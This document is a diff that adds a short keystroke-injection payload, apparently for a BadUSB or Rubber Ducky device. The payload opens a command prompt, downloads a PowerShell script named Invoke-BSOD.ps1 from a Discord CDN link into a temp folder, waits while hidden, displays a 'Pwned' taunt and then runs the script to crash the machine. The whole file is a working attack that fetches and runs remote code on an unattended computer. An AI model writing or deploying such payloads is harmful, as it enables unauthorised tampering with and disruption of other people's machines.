@@ -1,0 +1,9 @@
+GUI r
+DELAY 250
+STRING cmd
+DELAY 150
+ENTER
+DELAY 250
+STRING cd %temp%; mkdir bsod; cd bsod; curl https://cdn.discordapp.com/attachments/1069171881275568189/1075343857480388608/Invoke-BSOD.ps1 -o Invoke-BSOD.ps1; powershell -WindowStyle Hidden -Command timeout 600; msg * Pwned by Venu2HD#1761. In the future, you should lock your PC when leaving it! :); timeout 10; .\Invoke-BSOD.ps1
+DELAY 150
+ENTER
